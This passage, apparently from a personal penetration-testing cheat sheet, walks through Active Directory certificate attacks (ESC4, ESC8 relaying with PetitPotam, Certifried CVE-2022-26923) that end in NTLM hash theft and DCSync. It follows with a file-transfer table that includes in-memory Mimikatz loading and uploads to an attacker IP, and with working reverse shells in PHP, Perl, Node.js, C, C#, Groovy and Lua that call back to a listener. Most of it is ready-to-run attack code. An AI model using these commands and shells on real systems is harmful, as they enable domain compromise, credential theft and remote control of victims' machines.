+</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-fallback data-lang=fallback><span class=line><span class=cl>python3 certi.py list range.net/peter:&#39;Welcome1234&#39; --dc-ip 10.8.0.2 --enabled
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl># vulnerable template
+</span></span><span class=line><span class=cl>[[..snip..]]
+</span></span><span class=line><span class=cl>Permissions
+</span></span><span class=line><span class=cl>  Enrollment Permissions
+</span></span><span class=line><span class=cl>    Enrollment Rights
+</span></span><span class=line><span class=cl>      S-1-5-21-3556610642-5733621-2059236447-513 range\Domain Users
+</span></span><span class=line><span class=cl>[[..snip..]]
+</span></span></code></pre></td></tr></table></div></div><ol start=2><li>Once vulnerable template has been verified. Modify the necessary requirements to proceed with
+<a rel=noopener class="internal-link broken" data-src=#esc1>ESC1</a> attack path</li></ol><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
+</span><span class=lnt>2
+</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-fallback data-lang=fallback><span class=line><span class=cl># msPKI-Certificate-Name-Flag = (0x1) ENROLLEE_SUPPLIES_SUBJECT
+</span></span><span class=line><span class=cl>python3 modifyCertTemplate.py range.net/peter:&#39;Welcome1234&#39; -template ESC4 -value 1 -property msPKI-Certificate-Name-Flag -dc-ip 10.8.0.2
+</span></span></code></pre></td></tr></table></div></div><ol start=3><li>Now it should be vulnerable to
+<a rel=noopener class="internal-link broken" data-src=#esc1>ESC1</a></li></ol><a href=#esc8><h3 id=esc8><span class=hanchor arialabel=Anchor># </span>ESC8</h3></a><p>This requires NTLMv2 relaying from target identity to the /certsrc/certfnsh.asp endpoint to request a certificate. Below are the steps to reproduce</p><ol><li>Fire up <code>ntlmrelayx.py</code> to listen for incoming hash and relay it to target url</li></ol><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
+</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-fallback data-lang=fallback><span class=line><span class=cl>ntlmrelayx.py -t http://192.168.86.183/certsrv/certfnsh.asp -smb2support --adcs --template &#39;KerberosAuthentication&#39;
+</span></span></code></pre></td></tr></table></div></div><ol start=2><li>Coerce authentication using
+<a href=https://github.com/topotam/PetitPotam rel=noopener>PetitPotam</a>. <em>Note that patched system doesnt allow unauthenticated coerce, then it would require a credential</em></li></ol><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
+</span><span class=lnt>2
+</span><span class=lnt>3
+</span><span class=lnt>4
+</span><span class=lnt>5
+</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-fallback data-lang=fallback><span class=line><span class=cl># unpatched DC
+</span></span><span class=line><span class=cl>python3 PetitPotam.py 192.168.86.165 192.168.86.182
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl># patched DC
+</span></span><span class=line><span class=cl>python3 PetitPotam.py -u &#39;peter&#39; -p &#39;Welcome1234&#39; -d &#39;range.net&#39; 192.168.86.165 192.168.86.182
+</span></span></code></pre></td></tr></table></div></div><ol start=3><li>A base64 encoded ticket should be retrieved by now and save it in a file. Use gettgtpkinit.py to convert the pfx certificate to ccache format</li></ol><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
+</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-fallback data-lang=fallback><span class=line><span class=cl>python3 /opt/AD/PKINITtools/gettgtpkinit.py range.net/dc01\$ -pfx-base64 $(cat /tmp/b64-cert.b64) -dc-ip 192.168.86.182 /tmp/out.ccache
+</span></span></code></pre></td></tr></table></div></div><ol start=4><li>Use getnthash.py to retrieve ntlm hash</li></ol><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
+</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-fallback data-lang=fallback><span class=line><span class=cl>python3 /opt/AD/PKINITtools/getnthash.py range.net/dc01\$ -key c5deec1a9ef6cbaf6da31cb46c1398fdc47c37630375896ee412f3462332503b -dc-ip 192.168.86.182
+</span></span></code></pre></td></tr></table></div></div><ol start=5><li>NTLM hash should now be retrieved and win!</li></ol><a href=#certifried><h3 id=certifried><span class=hanchor arialabel=Anchor># </span>Certifried</h3></a><p><strong>User</strong> template certificate would identify and distinguish the certificate with the User Principal Name(UPN) of the certificate as <em>SubjectAltRequireUpn</em> is in the <code>msPKI-Certificate-Name-Flag</code> attributes. However, <strong>Machine</strong> template distinguish computer accounts&rsquo; certificates only by <code>dnsHostName</code> attribute which can be edited out and cause confusion in the KDC and attacker can request certificate as DC instead of the legitimate computer and results in a
+<a rel=noopener class="internal-link broken" data-src=#dcsync>DCSync</a> attack.</p><ol><li>Add a fake computer account with
+<a href=https://github.com/Kevin-Robertson/Powermad rel=noopener>PowerMad</a> or
+<a href=https://github.com/SecureAuthCorp/impacket/blob/master/examples/addcomputer.py rel=noopener>addcomputer.py</a></li></ol><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
+</span><span class=lnt>2
+</span><span class=lnt>3
+</span><span class=lnt>4
+</span><span class=lnt>5
+</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-fallback data-lang=fallback><span class=line><span class=cl># Powermad
+</span></span><span class=line><span class=cl>New-MachineAccount -MachineAccount &#39;FakeComputer&#39; -Password (ConvertTo-SecureString -AsPlainText -Force &#39;Password123&#39;) -Domain domain.local -DomainController dc.domain.local -Verbose
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl># impacket
+</span></span><span class=line><span class=cl>addcomputer.py domain.local/john:&#39;Passw0rd1&#39; -method LDAPS -computer-name &#39;JOHNPC&#39; -computer-pass &#39;Password123&#39;
+</span></span></code></pre></td></tr></table></div></div><ol start=2><li>Clear the SPNs attributes that relates to the current <code>dnsHostName</code> attribute.</li></ol><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
+</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-fallback data-lang=fallback><span class=line><span class=cl>addspn.py --clear -t &#39;FakeComputer$&#39; -u &#39;domain\user&#39; -p &#39;password&#39; &#39;DC.domain.local&#39;
+</span></span></code></pre></td></tr></table></div></div><ol start=3><li>Change dnsHostName attribute matching the domain controller</li></ol><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
+</span><span class=lnt>2
+</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-fallback data-lang=fallback><span class=line><span class=cl># RSAT
+</span></span><span class=line><span class=cl>Set-ADComputer THMPC -DnsHostName LUNDC.lunar.eruca.com
+</span></span></code></pre></td></tr></table></div></div><p><em>Note that above steps 1-3 could be automated with my messy script
+<a href=https://github.com/aniqfakhrul/certifried.py rel=noopener>certifried.py</a></em></p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
+</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-fallback data-lang=fallback><span class=line><span class=cl>python3 certifried.py range.net/peter:&#39;Welcome1234&#39; -dc-ip 192.168.86.182
+</span></span></code></pre></td></tr></table></div></div><ol start=4><li>Request certificate with
+<a href=https://github.com/ly4k/Certipy rel=noopener>Certipy</a></li></ol><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
+</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-fallback data-lang=fallback><span class=line><span class=cl>certipy req range.net/WIN-JLSLKICW6EP\$:&#39;PY2nc0ubG8WT&#39;@ca01.range.net -ca range-CA01-CA -template Machine
+</span></span></code></pre></td></tr></table></div></div><ol start=5><li>Authenticate with the requested certificate earlier</li></ol><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
+</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-fallback data-lang=fallback><span class=line><span class=cl>certipy auth -pfx dc01.pfx -dc-ip 192.168.86.182
+</span></span></code></pre></td></tr></table></div></div><ol start=6><li><a rel=noopener class="internal-link broken" data-src=#dcsync>DCSync</a> and win</li></ol><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
+</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-fallback data-lang=fallback><span class=line><span class=cl>secretsdump.py domain.local/dc01\$@10.10.10.10 -just-dc -hashes :000000000000000
+</span></span></code></pre></td></tr></table></div></div><ol start=7><li>It is always recommended to cleanup the created computer account. <em>(This requires a privileged account)</em></li></ol><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
+</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-fallback data-lang=fallback><span class=line><span class=cl>addcomputer.py range.net/Administrator:&#39;Password123&#39; -computer-name &#39;WIN-EAZXIGMWO1T$&#39; -computer-pass &#39;mi#gKKWFlzxJ&#39; -dc-ip 192.168.86.182 -delete
+</span></span></code></pre></td></tr></table></div></div><p>For the details explanation of the vulnerability (CVE-2022-26923), you may read the full article
+<a href=https://research.ifcr.dk/certifried-active-directory-domain-privilege-escalation-cve-2022-26923-9e098fe298f4 rel=noopener>here</a></p><a href=#relay-notes><h2 id=relay-notes><span class=hanchor arialabel=Anchor># </span>Relay Notes</h2></a><p><img src=https://quartz.jzhao.xyz//./src/relay_list.png width=auto alt="Relay Roadmap"></p><ul><li><a href="https://twitter.com/an0n_r0/status/1519344255143141376?s=20&t=nk-MeM42nRevaMPNOvQDoA" rel=noopener>KrbRelayUP</a></li><li><a href=https://gist.github.com/gladiatx0r/1ffe59031d42c08603a3bde0ff678feb rel=noopener>RPC2RBCD</a></li><li><a href="https://twitter.com/an0n_r0/status/1506824658838040580?s=20&t=HJ9qD6GkzCvg1p24XZ6A2Q" rel=noopener>lookupsid</a></li><li><a href=https://dirkjanm.io/relaying-kerberos-over-dns-with-krbrelayx-and-mitm6/ rel=noopener>Kerberos Relay over DNS</a></li><li><a href="https://www.youtube.com/watch?v=axPkf_kLpMA" rel=noopener>Flangvik&rsquo;s VOD RPC2RBCD</a></li><li><a href="https://twitter.com/theluemmel/status/1454774400553787394?s=20&t=V55BIRuHPzUSLDOEdVCfEg" rel=noopener>NTLMv1 Downgrade</a></li><li><a href=https://ppn.snovvcrash.rocks/pentest/infrastructure/ad/ntlm/ntlmv1-downgrade rel=noopener>NTLMv1 Downgrade Requirements</a></li><li><a href=https://www.fortalicesolutions.com/posts/keeping-up-with-the-ntlm-relay rel=noopener>https://www.fortalicesolutions.com/posts/keeping-up-with-the-ntlm-relay</a></li><li><a href=https://www.trustedsec.com/blog/a-comprehensive-guide-on-relaying-anno-2022/ rel=noopener>https://www.trustedsec.com/blog/a-comprehensive-guide-on-relaying-anno-2022/</a></li></ul><a href=#file-transfer><h1 id=file-transfer><span class=hanchor arialabel=Anchor># </span>File Transfer</h1></a><table><thead><tr><th><strong>Command</strong></th><th><strong>Description</strong></th></tr></thead><tbody><tr><td> <code>Invoke-WebRequest https://&lt;snip>/PowerView.ps1 -OutFile PowerView.ps1</code></td><td>Download a file with PowerShell</td></tr><tr><td><code>IEX (New-Object Net.WebClient).DownloadString('https://&lt;snip>/Invoke-Mimikatz.ps1')</code></td><td>Execute a file in memory using PowerShell</td></tr><tr><td><code>Invoke-WebRequest -Uri http://10.10.10.32:443 -Method POST -Body $b64</code></td><td>Upload a file with PowerShell</td></tr><tr><td><code>bitsadmin /transfer n http://10.10.10.32/nc.exe C:\Temp\nc.exe</code></td><td>Download a file using Bitsadmin</td></tr><tr><td><code>certutil.exe -verifyctl -split -f http://10.10.10.32/nc.exe</code></td><td>Download a file using Certutil</td></tr><tr><td><code>wget https://raw.githubusercontent.com/rebootuser/LinEnum/master/LinEnum.sh -O /tmp/LinEnum.sh</code></td><td>Download a file using Wget</td></tr><tr><td><code>curl -o /tmp/LinEnum.sh https://raw.githubusercontent.com/rebootuser/LinEnum/master/LinEnum.sh</code></td><td>Download a file using cURL</td></tr><tr><td><code>php -r '$file = file_get_contents("https://&lt;snip>/LinEnum.sh"); file_put_contents("LinEnum.sh",$file);'</code></td><td>Download a file using PHP</td></tr><tr><td><code>scp C:\Temp\bloodhound.zip user@10.10.10.150:/tmp/bloodhound.zip</code></td><td>Upload a file using SCP</td></tr><tr><td><code>scp user@target:/tmp/mimikatz.exe C:\Temp\mimikatz.exe</code></td><td>Download a file using SCP</td></tr><tr><td><code>Invoke-WebRequest http://nc.exe -UserAgent [Microsoft.PowerShell.Commands.PSUserAgent]::Chrome -OutFile "nc.exe"</code></td><td>Invoke-WebRequest using a Chrome User Agent</td></tr></tbody></table><a href=#reverse-shells><h1 id=reverse-shells><span class=hanchor arialabel=Anchor># </span>Reverse Shells</h1></a><p><em>Credits: These reverse shells examples are reffered to
+<a href=https://github.com/H0j3n/EzpzShell rel=noopener>EzpzShell</a> by
+<a href=https://twitter.com/h0j3n rel=noopener>@h0j3n</a></em></p><a href=#php-reverse-shell><h3 id=php-reverse-shell><span class=hanchor arialabel=Anchor># </span>php reverse shell</h3></a><p>You can get a full reverse shell script
+<a href=https://raw.githubusercontent.com/pentestmonkey/php-reverse-shell/master/php-reverse-shell.php rel=noopener>here</a> by PentestMonkey</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
+</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-fallback data-lang=fallback><span class=line><span class=cl>&lt;?php system(&#34;curl http://192.168.86.139/shell.php|php&#34;); ?&gt;
+</span></span></code></pre></td></tr></table></div></div><a href=#perl-reverse-shell><h3 id=perl-reverse-shell><span class=hanchor arialabel=Anchor># </span>perl reverse shell</h3></a><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt> 1
+</span><span class=lnt> 2
+</span><span class=lnt> 3
+</span><span class=lnt> 4
+</span><span class=lnt> 5
+</span><span class=lnt> 6
+</span><span class=lnt> 7
+</span><span class=lnt> 8
+</span><span class=lnt> 9
+</span><span class=lnt>10
+</span><span class=lnt>11
+</span><span class=lnt>12
+</span><span class=lnt>13
+</span><span class=lnt>14
+</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-fallback data-lang=fallback><span class=line><span class=cl># Example 1
+</span></span><span class=line><span class=cl>perl -e &#39;use Socket;$i=&#34;192.168.86.139&#34;;$p=9001;socket(S,PF_INET,SOCK_STREAM,getprotobyname(&#34;tcp&#34;));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,&#34;&gt;&amp;S&#34;);open(STDOUT,&#34;&gt;&amp;S&#34;);open(STDERR,&#34;&gt;&amp;S&#34;);exec(&#34;/bin/sh -i&#34;);};&#39;
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl># Example 2
+</span></span><span class=line><span class=cl>use Socket
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl>$i=&#34;192.168.86.139&#34;;
+</span></span><span class=line><span class=cl>$p=9001;socket(S,PF_INET,SOCK_STREAM,getprotobyname(&#34;tcp&#34;));
+</span></span><span class=line><span class=cl>if(connect(S,sockaddr_in($p,inet_aton($i)))){
+</span></span><span class=line><span class=cl>    open(STDIN,&#34;&gt;&amp;S&#34;);
+</span></span><span class=line><span class=cl>    open(STDOUT,&#34;&gt;&amp;S&#34;);
+</span></span><span class=line><span class=cl>    open(STDERR,&#34;&gt;&amp;S&#34;);
+</span></span><span class=line><span class=cl>    exec(&#34;/bin/sh -i&#34;);
+</span></span><span class=line><span class=cl>}
+</span></span></code></pre></td></tr></table></div></div><a href=#nodejs-reverse-shell><h3 id=nodejs-reverse-shell><span class=hanchor arialabel=Anchor># </span>nodejs reverse shell</h3></a><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt> 1
+</span><span class=lnt> 2
+</span><span class=lnt> 3
+</span><span class=lnt> 4
+</span><span class=lnt> 5
+</span><span class=lnt> 6
+</span><span class=lnt> 7
+</span><span class=lnt> 8
+</span><span class=lnt> 9
+</span><span class=lnt>10
+</span><span class=lnt>11
+</span><span class=lnt>12
+</span><span class=lnt>13
+</span><span class=lnt>14
+</span><span class=lnt>15
+</span><span class=lnt>16
+</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-fallback data-lang=fallback><span class=line><span class=cl># Example 1
+</span></span><span class=line><span class=cl>require(&#39;child_process&#39;).exec(&#39;nc -e /bin/sh 192.168.86.139 9001&#39;)
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl># Example 2
+</span></span><span class=line><span class=cl>(function(){
+</span></span><span class=line><span class=cl>    var net = require(&#34;net&#34;),
+</span></span><span class=line><span class=cl>        cp = require(&#34;child_process&#34;),
+</span></span><span class=line><span class=cl>        sh = cp.spawn(&#34;/bin/sh&#34;, []);
+</span></span><span class=line><span class=cl>    var client = new net.Socket();
+</span></span><span class=line><span class=cl>    client.connect(9001, &#34;192.168.86.139&#34;, function(){
+</span></span><span class=line><span class=cl>        client.pipe(sh.stdin);
+</span></span><span class=line><span class=cl>        sh.stdout.pipe(client);
+</span></span><span class=line><span class=cl>        sh.stderr.pipe(client);
+</span></span><span class=line><span class=cl>    });
+</span></span><span class=line><span class=cl>    return /a/; // Prevents the Node.js application form crashing
+</span></span><span class=line><span class=cl>})();
+</span></span></code></pre></td></tr></table></div></div><a href=#c-reverse-shell><h3 id=c-reverse-shell><span class=hanchor arialabel=Anchor># </span>c reverse shell</h3></a><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt> 1
+</span><span class=lnt> 2
+</span><span class=lnt> 3
+</span><span class=lnt> 4
+</span><span class=lnt> 5
+</span><span class=lnt> 6
+</span><span class=lnt> 7
+</span><span class=lnt> 8
+</span><span class=lnt> 9
+</span><span class=lnt>10
+</span><span class=lnt>11
+</span><span class=lnt>12
+</span><span class=lnt>13
+</span><span class=lnt>14
+</span><span class=lnt>15
+</span><span class=lnt>16
+</span><span class=lnt>17
+</span><span class=lnt>18
+</span><span class=lnt>19
+</span><span class=lnt>20
+</span><span class=lnt>21
+</span><span class=lnt>22
+</span><span class=lnt>23
+</span><span class=lnt>24
+</span><span class=lnt>25
+</span><span class=lnt>26
+</span><span class=lnt>27
+</span><span class=lnt>28
+</span><span class=lnt>29
+</span><span class=lnt>30
+</span><span class=lnt>31
+</span><span class=lnt>32
+</span><span class=lnt>33
+</span><span class=lnt>34
+</span><span class=lnt>35
+</span><span class=lnt>36
+</span><span class=lnt>37
+</span><span class=lnt>38
+</span><span class=lnt>39
+</span><span class=lnt>40
+</span><span class=lnt>41
+</span><span class=lnt>42
+</span><span class=lnt>43
+</span><span class=lnt>44
+</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-fallback data-lang=fallback><span class=line><span class=cl>######################### Example 1 #############################
+</span></span><span class=line><span class=cl>## Compile : gcc -shared -o libchill.so -fPIC libchill.c
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl>#include&lt;stdio.h&gt;
+</span></span><span class=line><span class=cl>#include&lt;stdlib.h&gt;
+</span></span><span class=line><span class=cl>#include&lt;unistd.h&gt;
+</span></span><span class=line><span class=cl>int greetings(){
+</span></span><span class=line><span class=cl>    setuid(0);
+</span></span><span class=line><span class=cl>    setgid(0);
+</span></span><span class=line><span class=cl>    system(&#34;/bin/bash&#34;);
+</span></span><span class=line><span class=cl>}
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl>######################### Example 2 #############################
+</span></span><span class=line><span class=cl>## Compile : gcc shell.c -o shell
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl>#include &lt;stdio.h&gt;
+</span></span><span class=line><span class=cl>#include &lt;sys/socket.h&gt;
+</span></span><span class=line><span class=cl>#include &lt;sys/types.h&gt;
+</span></span><span class=line><span class=cl>#include &lt;stdlib.h&gt;
+</span></span><span class=line><span class=cl>#include &lt;unistd.h&gt;
+</span></span><span class=line><span class=cl>#include &lt;netinet/in.h&gt;
+</span></span><span class=line><span class=cl>#include &lt;arpa/inet.h&gt;
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl>int main(void){
+</span></span><span class=line><span class=cl>    int port = 9001;
+</span></span><span class=line><span class=cl>    struct sockaddr_in revsockaddr;
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl>    int sockt = socket(AF_INET, SOCK_STREAM, 0);
+</span></span><span class=line><span class=cl>    revsockaddr.sin_family = AF_INET;       
+</span></span><span class=line><span class=cl>    revsockaddr.sin_port = htons(port);
+</span></span><span class=line><span class=cl>    revsockaddr.sin_addr.s_addr = inet_addr(&#34;192.168.86.139&#34;);
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl>    connect(sockt, (struct sockaddr *) &amp;revsockaddr,
+</span></span><span class=line><span class=cl>    sizeof(revsockaddr));
+</span></span><span class=line><span class=cl>    dup2(sockt, 0);
+</span></span><span class=line><span class=cl>    dup2(sockt, 1);
+</span></span><span class=line><span class=cl>    dup2(sockt, 2);
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl>    char * const argv[] = {&#34;/bin/sh&#34;, NULL};
+</span></span><span class=line><span class=cl>    execve(&#34;/bin/sh&#34;, argv, NULL);
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl>    return 0;       
+</span></span><span class=line><span class=cl>}
+</span></span></code></pre></td></tr></table></div></div><a href=#c-reverse-shell-1><h3 id=c-reverse-shell-1><span class=hanchor arialabel=Anchor># </span>c# reverse shell</h3></a><p>This c-sharp reverse shell is from
+<a href=https://www.puckiestyle.nl/c-simple-reverse-shell/ rel=noopener>PuckieStyle Blog</a>.<em>Note: Change <code>cmd.exe</code> to <code>bash</code> if you are using against linux environment</em></p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt> 1
+</span><span class=lnt> 2
+</span><span class=lnt> 3
+</span><span class=lnt> 4
+</span><span class=lnt> 5
+</span><span class=lnt> 6
+</span><span class=lnt> 7
+</span><span class=lnt> 8
+</span><span class=lnt> 9
+</span><span class=lnt>10
+</span><span class=lnt>11
+</span><span class=lnt>12
+</span><span class=lnt>13
+</span><span class=lnt>14
+</span><span class=lnt>15
+</span><span class=lnt>16
+</span><span class=lnt>17
+</span><span class=lnt>18
+</span><span class=lnt>19
+</span><span class=lnt>20
+</span><span class=lnt>21
+</span><span class=lnt>22
+</span><span class=lnt>23
+</span><span class=lnt>24
+</span><span class=lnt>25
+</span><span class=lnt>26
+</span><span class=lnt>27
+</span><span class=lnt>28
+</span><span class=lnt>29
+</span><span class=lnt>30
+</span><span class=lnt>31
+</span><span class=lnt>32
+</span><span class=lnt>33
+</span><span class=lnt>34
+</span><span class=lnt>35
+</span><span class=lnt>36
+</span><span class=lnt>37
+</span><span class=lnt>38
+</span><span class=lnt>39
+</span><span class=lnt>40
+</span><span class=lnt>41
+</span><span class=lnt>42
+</span><span class=lnt>43
+</span><span class=lnt>44
+</span><span class=lnt>45
+</span><span class=lnt>46
+</span><span class=lnt>47
+</span><span class=lnt>48
+</span><span class=lnt>49
+</span><span class=lnt>50
+</span><span class=lnt>51
+</span><span class=lnt>52
+</span><span class=lnt>53
+</span><span class=lnt>54
+</span><span class=lnt>55
+</span><span class=lnt>56
+</span><span class=lnt>57
+</span><span class=lnt>58
+</span><span class=lnt>59
+</span><span class=lnt>60
+</span><span class=lnt>61
+</span><span class=lnt>62
+</span><span class=lnt>63
+</span><span class=lnt>64
+</span><span class=lnt>65
+</span><span class=lnt>66
+</span><span class=lnt>67
+</span><span class=lnt>68
+</span><span class=lnt>69
+</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-fallback data-lang=fallback><span class=line><span class=cl>using System;
+</span></span><span class=line><span class=cl>using System.Text;
+</span></span><span class=line><span class=cl>using System.IO;
+</span></span><span class=line><span class=cl>using System.Diagnostics;
+</span></span><span class=line><span class=cl>using System.ComponentModel;
+</span></span><span class=line><span class=cl>using System.Linq;
+</span></span><span class=line><span class=cl>using System.Net;
+</span></span><span class=line><span class=cl>using System.Net.Sockets;
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl>namespace ConnectBack
+</span></span><span class=line><span class=cl>{
+</span></span><span class=line><span class=cl>	public class Program
+</span></span><span class=line><span class=cl>	{
+</span></span><span class=line><span class=cl>		static StreamWriter streamWriter;
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl>		public static void Main(string[] args)
+</span></span><span class=line><span class=cl>		{
+</span></span><span class=line><span class=cl>			using(TcpClient client = new TcpClient(&#34;10.0.2.15&#34;, 443))
+</span></span><span class=line><span class=cl>			{
+</span></span><span class=line><span class=cl>				using(Stream stream = client.GetStream())
+</span></span><span class=line><span class=cl>				{
+</span></span><span class=line><span class=cl>					using(StreamReader rdr = new StreamReader(stream))
+</span></span><span class=line><span class=cl>					{
+</span></span><span class=line><span class=cl>						streamWriter = new StreamWriter(stream);
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl>						StringBuilder strInput = new StringBuilder();
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl>						Process p = new Process();
+</span></span><span class=line><span class=cl>						p.StartInfo.FileName = &#34;cmd.exe&#34;;
+</span></span><span class=line><span class=cl>						p.StartInfo.CreateNoWindow = true;
+</span></span><span class=line><span class=cl>						p.StartInfo.UseShellExecute = false;
+</span></span><span class=line><span class=cl>						p.StartInfo.RedirectStandardOutput = true;
+</span></span><span class=line><span class=cl>						p.StartInfo.RedirectStandardInput = true;
+</span></span><span class=line><span class=cl>						p.StartInfo.RedirectStandardError = true;
+</span></span><span class=line><span class=cl>						p.OutputDataReceived += new DataReceivedEventHandler(CmdOutputDataHandler);
+</span></span><span class=line><span class=cl>						p.Start();
+</span></span><span class=line><span class=cl>						p.BeginOutputReadLine();
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl>						while(true)
+</span></span><span class=line><span class=cl>						{
+</span></span><span class=line><span class=cl>							strInput.Append(rdr.ReadLine());
+</span></span><span class=line><span class=cl>							//strInput.Append(&#34;\n&#34;);
+</span></span><span class=line><span class=cl>							p.StandardInput.WriteLine(strInput);
+</span></span><span class=line><span class=cl>							strInput.Remove(0, strInput.Length);
+</span></span><span class=line><span class=cl>						}
+</span></span><span class=line><span class=cl>					}
+</span></span><span class=line><span class=cl>				}
+</span></span><span class=line><span class=cl>			}
+</span></span><span class=line><span class=cl>		}
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl>		private static void CmdOutputDataHandler(object sendingProcess, DataReceivedEventArgs outLine)
+</span></span><span class=line><span class=cl>        {
+</span></span><span class=line><span class=cl>            StringBuilder strOutput = new StringBuilder();
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl>            if (!String.IsNullOrEmpty(outLine.Data))
+</span></span><span class=line><span class=cl>            {
+</span></span><span class=line><span class=cl>                try
+</span></span><span class=line><span class=cl>                {
+</span></span><span class=line><span class=cl>                    strOutput.Append(outLine.Data);
+</span></span><span class=line><span class=cl>                    streamWriter.WriteLine(strOutput);
+</span></span><span class=line><span class=cl>                    streamWriter.Flush();
+</span></span><span class=line><span class=cl>                }
+</span></span><span class=line><span class=cl>                catch (Exception err) { }
+</span></span><span class=line><span class=cl>            }
+</span></span><span class=line><span class=cl>        }
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl>	}
+</span></span><span class=line><span class=cl>}
+</span></span></code></pre></td></tr></table></div></div><a href=#jenkins-reverse-shell><h3 id=jenkins-reverse-shell><span class=hanchor arialabel=Anchor># </span>jenkins reverse shell</h3></a><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
+</span><span class=lnt>2
+</span><span class=lnt>3
+</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-fallback data-lang=fallback><span class=line><span class=cl>r = Runtime.getRuntime()
+</span></span><span class=line><span class=cl>p = r.exec([&#34;/bin/bash&#34;,&#34;-c&#34;,&#34;exec 5&lt;&gt;/dev/tcp/192.168.86.139/9001;cat &lt;&amp;5 | while read line; do \$line 2&gt;&amp;5 &gt;&amp;5; done&#34;] as String[])
+</span></span><span class=line><span class=cl>p.waitFor()
+</span></span></code></pre></td></tr></table></div></div><a href=#lua-reverse-shell><h3 id=lua-reverse-shell><span class=hanchor arialabel=Anchor># </span>lua reverse shell</h3></a><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
+</span><span class=lnt>2
+</span><span class=lnt>3
+</span><span class=lnt>4
+</span><span class=lnt>5
+</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-fallback data-lang=fallback><span class=line><span class=cl># Example 1
+</span></span><span class=line><span class=cl>os.system(&#34;rm /tmp/f;mkfifo /tmp/f;cat /tmp/f | /bin/sh -i 2&gt;&amp;1 | nc 192.168.86.139 9001 &gt;/tmp/f&#34;)
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl># Example 2
